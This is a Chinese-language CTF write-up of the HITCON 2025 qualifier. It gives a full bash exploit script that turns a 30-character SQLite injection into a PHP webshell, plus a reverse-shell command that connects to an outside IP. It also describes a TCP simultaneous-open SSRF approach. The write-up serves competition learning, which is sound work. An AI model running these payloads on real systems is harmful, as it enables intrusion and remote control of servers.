---
title: "HITCON CTF 2025 Qual Writeup"
date: 2025-08-25T00:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.png
description: ""
toc: 
---

# hitconctf-2025-writeup

今年因為決賽是台灣限定交流賽，台灣前四就能打決賽，因此我們跟竹狐還有吉娃娃跟 Cake 就提議說拆開打（雖說竹狐那邊不知在衝三小賽前一週給我偷襲收了一坨人進去，只能說譴責：（ 說好分開打都假的

![image](https://github.com/user-attachments/assets/3bf316ac-1861-4008-9378-b1a5575300ae)

![image](https://github.com/user-attachments/assets/91636a76-8533-47f6-a62e-470f01c2543d)

![image](https://github.com/user-attachments/assets/6f93432e-6179-4810-abd0-43ba222d9080)

![image](https://github.com/user-attachments/assets/c1e9d7ca-1e5f-4647-87c7-a7619135e808)

![image](https://github.com/user-attachments/assets/e391e79d-3e14-4eff-9991-ce48db468621)

然而這次剛好卡[元智資安體驗營](https://localadmissions.yzu.edu.tw/campCont?id=31)我跟 [Vincent](https://blog.vincent55.tw/) 還有[三角蛇](https://blog.trianglesnake.com/)有接講師，~~然後我題目簡報還沒生出來~~，再加上前天熬夜破台 OSEP 很想睡覺所以初賽只能解一題半 [orange](https://blog.orange.tw/) 的題目幫幫忙QQ。

![image](https://github.com/user-attachments/assets/5a89bee6-4ea7-43e3-bf95-843767c2f368)

![image](https://github.com/user-attachments/assets/11e20150-d56a-4792-963c-fc6d38ccee69)

這邊就來寫一下我解的題目 writeup。

## 戰績

![image](https://github.com/user-attachments/assets/e14e0c77-f11a-4773-b8d2-fc29bb0a12ab)

![image](https://github.com/user-attachments/assets/fe6ead10-a006-4aae-ad62-5dc1e8186931)

## pholyglot

![image](https://github.com/user-attachments/assets/e078ea1f-eb31-4a6e-a078-361f89298f0a)

題目長這樣

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox) or die("err?");

    $msg = @$_GET['msg'];
    if (isset($msg) && strlen($msg) <= 30) {
        usleep(random_int(133, 3337));

        $db = new SQLite3(".db");
        $db->exec(sprintf("
            CREATE TABLE msg (content TEXT);
            INSERT INTO msg VALUES('%s');
        ", $msg));
        $db->close();

        unlink(".db");
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    } else {
        highlight_file(__FILE__);
```

要你拿 rce 拿 shell ，有一個裸的 SQLi 但限制 30 字，我們可以利用 sqlite 的 `VACUUM INTO` 來寫檔，經過極限的壓縮，最小可以寫出一個可以執行 3 個字 shell 指令 php 的 SQLi EX: ``<?=`cat`;');VACUUM INTO('c.php``

如果說可以執行四個字就可以用 [2017 orange 出的 4 字 php RCE 解掉了](https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#babyfirst-revenge-v2) 所以這邊想辦法讓能執行的指令長度變長，後來想到我可以用 SQLi 寫檔寫出一組 cp 或 mv 的指令後去蓋原本存在的 php 檔來讓我能跑的指令長度變長，比如：

```bash
curl "$1/?msg=$(urlencode "');VACUUM INTO('cp")"
curl "$1/?msg=$(urlencode '<?=`ip add`;'"');VACUUM INTO('z")"
curl "$1/?msg=$(urlencode '<?=`*`;'"');VACUUM INTO('z.php")"
curl "$1/sandbox/$2/z.php"
curl "$1/sandbox/$2/z.php"
```

這樣就成功把能執行的指令長度變長了，而且還不需要 RCE 寫檔建 gadget，只需要 SQLi 寫檔就好。

所以流程就是：

1. 寫檔 `cp`
2. 寫檔 `z` 內容為 ``<?=`ls>_`;``
3. 寫檔 `z.php` 內容為 ``<?=`*`;``
4. 瀏覽 `z.php` 觸發 `*` 會執行 `cp z z.php` 將 `z.php` 的內容改為 ``<?=`ls>_`;``
5. 寫檔 `cz` 內容為 ``<?=`sh _`;``
6. 寫檔 `cz.php` 內容為 ``<?=`c*`;``
7. 瀏覽 `cz.php` 觸發 `c*` 會執行 `cp cz cz.php` 將 `cz.php` 的內容改為 ``<?=`sh _`;``
8. 寫檔 `mv`
9. 寫檔 `mz` 內容為 ``<?=`sh x`;``
10. 寫檔 `mz.php` 內容為 ``<?=`m*`;``
11. 瀏覽 `mz.php` 觸發 `m*` 會執行 `mv mz mz.php` 將 `mz.php` 的內容改為 ``<?=`sh x`;``
12. 寫檔 `ls -t>x`
13. 瀏覽 `z.php` 觸發 `ls>_` 會將以下內容寫入 `_` 檔案
```bash
cp
cz
cz.php
ls -t>x
mv
mz.php
z
z.php
```
14. 寫檔 `>a.php`
15. 寫檔 <code>\`$_GET[0]`;'\\</code>
16. 寫檔 `echo '<?=`
17. 瀏覽 `cz.php` 觸發 `sh _` 會將以下內容寫入 `x` 檔案
```bash
echo '<?=
`$_GET[0]`;'\
>a.php
_
ls -t>x
mz.php
mv
cz.php
cz
z.php
z
cp
```
18. 瀏覽 `mz.php` 觸發 `sh x` 會將以下內容寫入 `a.php` 檔案
```php
<?=
`$_GET[0]`;
```

```bash
#!/bin/bash

curl "$1/?msg=$(urlencode "');VACUUM INTO('cp")"
curl "$1/?msg=$(urlencode '<?=`ls>_`;'"');VACUUM INTO('z")"
curl "$1/?msg=$(urlencode '<?=`*`;'"');VACUUM INTO('z.php")"
curl "$1/sandbox/$2/z.php"

curl "$1/?msg=$(urlencode '<?=`sh _`;'"');VACUUM INTO('cz")"
curl "$1/?msg=$(urlencode '<?=`c*`;'"');VACUUM INTO('cz.php")"
curl "$1/sandbox/$2/cz.php"

curl "$1/?msg=$(urlencode "');VACUUM INTO('mv")"
curl "$1/?msg=$(urlencode '<?=`sh x`;'"');VACUUM INTO('mz")"
curl "$1/?msg=$(urlencode '<?=`m*`;'"');VACUUM INTO('mz.php")"
curl "$1/sandbox/$2/mz.php"

curl "$1/?msg=$(urlencode "');VACUUM INTO('ls -t>x")"

curl "$1/sandbox/$2/z.php"

curl "$1/?msg=$(urlencode "');VACUUM INTO('>a.php")"
curl "$1/?msg=$(urlencode "');VACUUM INTO('\`\$_GET[0]\`;''\\")"
curl "$1/?msg=$(urlencode "');VACUUM INTO('echo ''<?=")"

curl "$1/sandbox/$2/cz.php"

curl "$1/sandbox/$2/mz.php"
```

`bash exploit.sh http://orange.chal.hitconctf.com d9b7c60822d381105ce4452d0c770ce3`

這樣 webshell 就完成了

因為 `/read_flag` 要解數學題所以接著彈 reverse shell 出來

`curl "http://orange.chal.hitconctf.com/sandbox/d9b7c60822d381105ce4452d0c770ce3/a.php?0=$(urlencode 'bash -c "bash -i >& /dev/tcp/160.187.198.4/22222 0>&1"')"`

然後原本以為這樣就結束了，結果發現因為 `/read_flag` 沒有 flush stdout RRRRR

![image](https://github.com/user-attachments/assets/d6d0ec87-8d5e-4940-b60a-23f5c269ade4)

當時因為是大半夜我很想睡覺所以有點暴躁

總之花了一些時間想辦法在 reverse shell 上搞一個 pty 出來（我就爛之前沒這樣弄過 QQ）

後來是 [pwn2ooown](https://pwn2ooown.tech/) 幫忙成功用 `script -qc /bin/bash /dev/null` 開一個 pty 出來讀 flag 才結束

事後 [pwn2ooown](https://pwn2ooown.tech/) 表示

![image](https://github.com/user-attachments/assets/bfafab19-c815-427f-a0b0-b4ccdf837a4f)

然後我結束後問一坨人怎解的他們說直接用 webshell 爆他乘法的答案，~~這邊就很想問 [orange](https://blog.orange.tw/) 這是不是 intended~~

## No Man's Echo

![image](https://github.com/user-attachments/assets/0c2835be-c200-48c0-b158-848f640b06fb)

題目長這樣

```php
<?php                                                                                                                                                                                                                    $probe = (int)@$_GET['probe'];
        $range = range($probe, $probe + 42);
        shuffle($range);

        foreach ($range as $k => $port) {
                $target = sprintf("tcp://%s:%d", $_SERVER['SERVER_ADDR'], $port);
                $fp = @stream_socket_client($target, $errno, $errstr, 1);
            if (!$fp) continue;

            stream_set_timeout($fp, 1);
            fwrite($fp, file_get_contents("php://input"));
            $data = fgets($fp);
            if (strlen($data) > 0) {
                $data = json_decode($data);
                if (isset($data->signal) && $data->signal == 'Arrival')
                        eval($data->logogram);

                fclose($fp);
                exit(-1);
            }
        }
        highlight_file(__FILE__);
```

基本上就是裸的 SSRF 但是只能控 port 而且 destination ip 永遠是 `$_SERVER['SERVER_ADDR']` 基本上就當作是 `localhost` 就好，要想辦法讓他 SSRF 後收到惡意且指定格式的 json 裡面有 php 指令來 RCE，那這樣怎麼辦呢？不可能憑空在伺服器電腦上開 port 吧！

這時候有一點網路基礎的人就應該要直接聯想到可以做 TCP Simultaneous Open，簡單來說就是開兩個 tcp client 然後讓他們做 p2p 的連線。

基本上想法就是開兩個 client 然後想辦法讓這兩個 client 的 source port 剛好等於對方的 destination port 就好，但因為 source port 通常是不可控的，所以理論上要炸，為了可以比較穩並的炸出來，之前在研究 tcp timestamp 的時候有看到 port 在 linux 上的生成算法其實也是類似的方式生成的

有興趣可以[參考這篇文章](https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/)

所以整個思路就是

1. 先連到他的 web server 錄 tcp 封包
2. 找出他的 tcp seq 然後算出他的 `net_secret`
3. 用 `net_secret` + ip 預估出可能會出現的 port range
4. race

但是因為現在時間已經是講課前一天，~~我她媽一題 CTF 題目都沒生出來連梗都沒想到~~，所以我只好把寫 exploit 的公作外包給 [pwn2ooown](https://pwn2ooown.tech/)

![image](https://github.com/user-attachments/assets/c2932217-d125-40dc-9322-7b6088872dab)

結果 [pwn2ooown](https://pwn2ooown.tech/) 表示

![image](https://github.com/user-attachments/assets/7bee4856-c2d4-48bf-90b3-14e3fdcc549c)

好喔，看來我想太難了W

## 其他隊友的 writeup

[Hackmd](https://hackmd.io/@Vincent550102/SJdfWT_Feg)

最後題外話，後來我出了一題 ARP Spoofing 一題 TLS MITM 還用 instancer 包的漂漂亮亮的結果沒人機，我真的很難過QQQQ

文章最後來補個 [Vincent](https://blog.vincent55.tw/) 表示要 1 個打 100 個的宣言

![image](https://github.com/user-attachments/assets/7193dc8a-7911-4ee4-a414-8b28db8db144)

![image](https://github.com/user-attachments/assets/0fa5099e-fc0d-4478-9dea-2f6e3dc8ffc5)


